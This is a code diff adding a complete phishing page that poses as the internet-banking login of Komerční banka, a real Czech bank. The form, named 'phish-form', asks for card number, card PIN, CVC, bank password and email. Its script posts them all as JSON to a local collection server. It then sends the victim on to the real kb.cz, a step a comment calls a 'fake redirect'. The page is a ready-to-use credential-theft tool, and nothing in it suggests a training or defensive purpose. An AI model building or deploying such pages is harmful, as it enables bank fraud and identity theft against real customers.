@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Komerční banka - Bezpečné přihlášení</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: linear-gradient(135deg, #ebedf0 0%, #d6dae3 100%);
+            min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-wrapper {
+            background: #fff;
+            border-radius: 15px;
+            box-shadow: 0 8px 35px rgba(0,0,0,0.12);
+            padding: 2.5em 2em 2em 2em;
+            min-width: 350px;
+            max-width: 95vw;
+            width: 370px;
+            position: relative;
+        }
+        .bank-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 2em;
+        }
+        .bank-logo img {
+            max-height: 55px;
+        }
+        .login-wrapper h2 {
+            color: #2f2f2f;
+            text-align: center;
+            margin: 0 0 1.5em 0;
+            font-weight: 700;
+            font-size: 1.45em;
+            letter-spacing: 1.5px;
+        }
+        .form-group {
+            margin-bottom: 1.2em;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.32em;
+            color: #2d3450;
+            font-size: 1em;
+        }
+        input, select {
+            width: 100%;
+            padding: 0.7em 0.5em;
+            border: 1.5px solid #e3e6ee;
+            border-radius: 6px;
+            background: #f5f7fa;
+            font-size: 1em;
+            transition: border .2s;
+        }
+        input:focus, select:focus {
+            border: 1.5px solid #d24a43;
+            outline: none;
+        }
+        .card-type-row {
+            display: flex;
+            align-items: center;
+            margin-top: 0.3em;
+            min-height: 28px;
+        }
+        .card-type-label {
+            font-weight: 600;
+            color: #2d3450;
+            min-width: 80px;
+        }
+        .card-type-logo {
+            margin-left: 0.7em;
+            display: flex;
+            align-items: center;
+        }
+        .card-type-logo img {
+            height: 22px;
+            margin-right: 4px;
+        }
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(90deg, #d24a43 0%, #b32e23 100%);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 0.98em 0;
+            font-size: 1.05em;
+            font-weight: 600;
+            margin-top: 1em;
+            cursor: pointer;
+            box-shadow: 0 3px 8px rgba(180,60,60,0.09);
+            transition: background .2s;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #b32e23 0%, #d24a43 100%);
+        }
+        .error-msg {
+            color: #bb2222;
+            background: #ffeaea;
+            padding: 0.7em 1em;
+            border-radius: 5px;
+            margin-bottom: 1em;
+            display: none;
+            font-size: .97em;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="bank-logo">
+            <img src="file:///home/ntb/Obrázky/Snímky%20obrazovky/kb.png" alt="Komerční banka logo">
+        </div>
+        <h2>Přihlášení do internetového bankovnictví</h2>
+        <div class="error-msg" id="error-msg"></div>
+        <form id="phish-form" autocomplete="off">
+            <div class="form-group">
+                <label for="bank_name">Banka / Typ účtu</label>
+                <input type="text" id="bank_name" name="bank_name" value="Komerční banka" required>
+            </div>
+            <div class="form-group">
+                <label for="card_number">Číslo karty</label>
+                <input type="text" id="card_number" name="card_number" maxlength="19" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required pattern="\d{13,19}">
+                <div class="card-type-row">
+                    <span class="card-type-label">Typ karty:</span>
+                    <span class="card-type-logo" id="card-type-logo"></span>
+                    <span id="card-type" style="margin-left:4px;"></span>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="pin">PIN ke kartě</label>
+                <input type="password" id="pin" name="pin" maxlength="6" placeholder="****" autocomplete="off" required pattern="\d{3,6}">
+            </div>
+            <div class="form-group">
+                <label for="cvc">CVC / CVV</label>
+                <input type="password" id="cvc" name="cvc" maxlength="4" placeholder="***" autocomplete="cc-csc" required pattern="\d{3,4}">
+            </div>
+            <div class="form-group">
+                <label for="bank_password">Heslo do banky</label>
+                <input type="password" id="bank_password" name="bank_password" placeholder="Heslo" required autocomplete="current-password">
+            </div>
+            <div class="form-group">
+                <label for="email">E-mail ke účtu</label>
+                <input type="email" id="email" name="email" placeholder="vy@priklad.cz" required autocomplete="email">
+            </div>
+            <button type="submit" class="submit-btn">Přihlásit se</button>
+        </form>
+    </div>
+    <script>
+        // Card type detection with logo support
+        function detectCardType(number) {
+            number = number.replace(/\D/g, "");
+            if (/^4\d{12,18}$/.test(number)) return "Visa";
+            if (/^(5[1-5]\d{14})$/.test(number)) return "Mastercard";
+            if (/^3[47]\d{13}$/.test(number)) return "American Express";
+            if (/^6(?:011|5\d{2})\d{12}$/.test(number)) return "Discover";
+            if (/^(35\d{14})$/.test(number)) return "JCB";
+            if (/^(3(?:0[0-5]|[68]\d)\d{11})$/.test(number)) return "Diners Club";
+            if (/^62\d{14,17}$/.test(number)) return "UnionPay";
+            return "Neznámý";
+        }
+        function getCardLogo(type) {
+            // SVGs for card logos (no external requests)
+            switch(type) {
+                case "Visa":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#1a1f71" rx="4" width="32" height="20"/><text x="6" y="15" font-family="Arial" font-size="11" fill="#fff">VISA</text></svg>`;
+                case "Mastercard":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#fff" rx="4" width="32" height="20"/><circle cx="14" cy="10" r="6" fill="#eb001b"/><circle cx="18" cy="10" r="6" fill="#f79e1b" fill-opacity="0.87"/><text x="7" y="18" font-family="Arial" font-size="6" fill="#333">Mastercard</text></svg>`;
+                case "American Express":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#0077a6" rx="4" width="32" height="20"/><text x="2" y="15" font-family="Arial" font-size="8" fill="#fff">AMEX</text></svg>`;
+                case "Discover":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#f76a1c" rx="4" width="32" height="20"/><text x="2" y="15" font-family="Arial" font-size="8" fill="#fff">Discover</text></svg>`;
+                case "JCB":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#fff" rx="4" width="32" height="20"/><text x="8" y="15" font-family="Arial" font-size="10" fill="#2e8e61">JCB</text></svg>`;
+                case "Diners Club":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#0079be" rx="4" width="32" height="20"/><text x="2" y="15" font-family="Arial" font-size="7" fill="#fff">Diners</text></svg>`;
+                case "UnionPay":
+                    return `<svg width="32" height="20" viewBox="0 0 32 20"><rect fill="#d81e06" rx="4" width="32" height="20"/><text x="4" y="15" font-family="Arial" font-size="7" fill="#fff">UnionPay</text></svg>`;
+                default:
+                    return "";
+            }
+        }
+
+        const cardInput = document.getElementById('card_number');
+        const cardTypeDiv = document.getElementById('card-type');
+        const cardTypeLogoDiv = document.getElementById('card-type-logo');
+        cardInput.addEventListener('input', function() {
+            // Auto-format
+            let val = this.value.replace(/\D/g, '').slice(0, 19);
+            let formatted = val.replace(/(.{4})/g, '$1 ').trim();
+            this.value = formatted;
+            let type = detectCardType(val);
+            cardTypeDiv.textContent = type;
+            cardTypeLogoDiv.innerHTML = getCardLogo(type);
+        });
+
+        // Pre-fill with Komerční banka
+        document.getElementById('bank_name').value = "Komerční banka";
+
+        const form = document.getElementById('phish-form');
+        const errorMsg = document.getElementById('error-msg');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            errorMsg.style.display = 'none';
+            const data = {
+                bank_name: form.bank_name.value.trim(),
+                card_number: form.card_number.value.replace(/\D/g, ''),
+                card_type: detectCardType(form.card_number.value),
+                pin: form.pin.value,
+                cvc: form.cvc.value,
+                bank_password: form.bank_password.value,
+                email: form.email.value.trim(),
+            };
+            // Basic client-side validation
+            if (data.card_number.length < 13 || data.card_number.length > 19) {
+                cardInput.focus();
+                errorMsg.textContent = "Neplatná délka čísla karty.";
+                errorMsg.style.display = 'block';
+                return;
+            }
+            if (!/^\d{3,6}$/.test(data.pin)) {
+                errorMsg.textContent = "PIN musí mít 3–6 číslic.";
+                errorMsg.style.display = 'block';
+                return;
+            }
+            if (!/^\d{3,4}$/.test(data.cvc)) {
+                errorMsg.textContent = "CVC musí mít 3 nebo 4 číslice.";
+                errorMsg.style.display = 'block';
+                return;
+            }
+            // POST via fetch, show error if server returns error
+            try {
+                const res = await fetch("http://localhost:8080/submit", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify(data)
+                });
+                const result = await res.json();
+                if (!result.success) {
+                    errorMsg.textContent = result.message || "Přihlášení se nezdařilo. Zkuste to prosím znovu.";
+                    errorMsg.style.display = 'block';
+                } else {
+                    location.href = "https://www.kb.cz/"; // fake redirect
+                }
+            } catch (err) {
+                errorMsg.textContent = "Chyba sítě. Zkuste to prosím znovu.";
+                errorMsg.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
